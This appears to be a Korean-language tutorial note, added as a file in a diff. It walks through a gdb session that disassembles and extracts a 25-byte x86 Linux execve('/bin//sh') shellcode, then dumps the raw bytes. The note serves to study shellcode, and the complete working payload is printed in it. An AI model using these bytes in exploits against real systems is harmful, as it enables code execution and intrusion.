@@ -1,0 +1,61 @@
+* Extract 25 Bytes Shell Code
+
+guybrush@nt900x5t:~/Project/github/hack/shellcode/optimization/shell_25/x86$ gdb -q asm_optimization_shell_25_atnt
+Reading symbols from asm_optimization_shell_25_atnt...(no debugging symbols found)...done.
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x080483db <+0>:	push   ebp
+   0x080483dc <+1>:	mov    ebp,esp
+   0x080483de <+3>:	xor    eax,eax
+   0x080483e0 <+5>:	push   eax
+   0x080483e1 <+6>:	push   0x68732f2f
+   0x080483e6 <+11>:	push   0x6e69622f
+   0x080483eb <+16>:	mov    ebx,esp
+   0x080483ed <+18>:	push   eax
+   0x080483ee <+19>:	push   ebx
+   0x080483ef <+20>:	mov    ecx,esp
+   0x080483f1 <+22>:	mov    edx,eax
+   0x080483f3 <+24>:	mov    al,0xb
+   0x080483f5 <+26>:	int    0x80
+   0x080483f7 <+28>:	nop
+   0x080483f8 <+29>:	pop    ebp
+   0x080483f9 <+30>:	ret
+End of assembler dump.
+
+
+=> main의 assembly code를 확인해보면, shell code 시작 주소가 "0x080483de <+3>:	xor    eax,eax"으로 0x080483de 임을 알 수 있고,
+   마지막 주소의 경우 int 0x80; 이 마지막 명령인데, 해당 명령의 다음 명령(nop) 주소가 0x080483f7 이므로 int 0x08; 명령의 주소는
+   0x080483f5 ~ 0x080483f6 임을 알 수 있다.
+=> 즉, 25 bytes shell code를 위한 assembly code의 주소는 다음과 같다.
+   시작주소 : 0x080483de
+   마지막주소 : 0x080483f6
+
+
+(gdb) p/x 0x080483f6 - 0x080483de
+$1 = 0x18
+
+
+=> shell code의 마지막주소에서 시작주소를 뺀 뒤 1을 더해준 값이 전체 shell code의 bytes수가 되므로,
+   우선, 마지막 주소에서 시작주소를 뺀 값을 구한다.
+
+
+(gdb) p/d 0x18
+$2 = 24
+
+
+=> 16진수 0x18은 10진수로 24
+=> 여기에 1을 더해주어야 하므로 shell code의 총 bytes 수는 25 bytes가 된다.
+
+
+(gdb) x/25bx 0x080483de
+0x80483de <main+3>:	0x31	0xc0	0x50	0x68	0x2f	0x2f	0x73	0x68
+0x80483e6 <main+11>:	0x68	0x2f	0x62	0x69	0x6e	0x89	0xe3	0x50
+0x80483ee <main+19>:	0x53	0x89	0xe1	0x89	0xc2	0xb0	0x0b	0xcd
+0x80483f6 <main+27>:	0x80
+(gdb)
+
+
+=> shell code 명령어의 시작주소인 0x080483de 부터 25 bytes를 dump 떠보면, 위와 같이 총 25 bytes의 shell code를 얻을 수 있다.
+
+
+
